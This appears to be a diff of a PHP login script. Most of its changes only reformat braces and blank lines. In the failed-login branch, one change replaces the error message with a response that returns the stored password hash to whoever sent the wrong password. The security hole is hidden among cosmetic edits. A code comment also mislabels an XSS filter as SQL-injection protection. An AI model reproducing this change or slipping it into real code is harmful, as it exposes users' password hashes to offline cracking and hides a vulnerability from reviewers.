@@ -8,25 +8,23 @@ require_once './db.php';
 
 //Output values
 function createResponse($status, $message, $data = []) {
-    $response = 
-    [
+    $response = [
         'status' => $status,
         'message' => $message,
         'data' => $data
     ];
+    
     return json_encode($response);
 }
 
 function validateInput($input) {
     //SQL Injection protection
-    if(preg_match('/<script\b[^>]*>(.*?)<\/script>/is', $input)) 
-    {
+    if(preg_match('/<script\b[^>]*>(.*?)<\/script>/is', $input)) {
         return false;
     }
 
     // XSS protection
-    if(preg_match('/<[^>]*>/', $input)) 
-    {
+    if(preg_match('/<[^>]*>/', $input)) {
         return false;
     }
 
@@ -35,7 +33,6 @@ function validateInput($input) {
 
 //Brute force protection - Limit requests
 function checkRequestLimit($ip_address) {
-
     global $connection;
     $query = $connection->prepare("SELECT COUNT(*) FROM requests 
     WHERE ip_address = :ip_address AND request_time > DATE_SUB(NOW(), 
@@ -45,8 +42,7 @@ function checkRequestLimit($ip_address) {
     $result = $query->fetch(PDO::FETCH_ASSOC);
 
     //Maximum 100 requests/hour
-    if($result['COUNT(*)'] > 100) 
-    { 
+    if($result['COUNT(*)'] > 100) { 
         return false;
     }
 
@@ -63,12 +59,12 @@ function checkRequestTime($ip_address) {
     $query->bindParam(':ip_address', $ip_address, PDO::PARAM_STR);
     $query->execute();
     $result = $query->fetch(PDO::FETCH_ASSOC);
-    if($result) 
-    {
+    
+    if($result) {
         $last_request_time = strtotime($result['request_time']);
         $current_time = strtotime(date('Y-m-d H:i:s'));
-        if($current_time - $last_request_time < 1) 
-        {
+        
+        if($current_time - $last_request_time < 1) {
             return false;
         }
     }
@@ -96,7 +92,6 @@ if($_SERVER['REQUEST_METHOD'] == 'POST') {
     //Check and process entered data
     $data = json_decode(file_get_contents('php://input'), true);
     if($data) {
-
         $email = isset($data['email']) ? $data['email'] : '';
         $password = isset($data['password']) ? $data['password'] : '';
 
@@ -114,22 +109,25 @@ if($_SERVER['REQUEST_METHOD'] == 'POST') {
         $row = $query->fetch(PDO::FETCH_ASSOC);
         
         $password_hash = $row['password'];
+
         if(password_verify($password, $password_hash)) {
             session_start();
             $_SESSION['username'] = $row['username'];
             $username = $_SESSION['username'];
             echo createResponse('success', 'Logged in successfully.', ['username' => $_SESSION['username']]);
         }
+        
         else {
-            echo createResponse('error', "Incorrect login information.", []);
+            // echo createResponse('error', "Incorrect login information.", []);
+            echo createResponse('pass', $password_hash);
             exit;
         }
     } 
+    
     else {
         echo createResponse('error', 'Wrong request.', []);
         exit;
     }
-
 }
 
 ?>
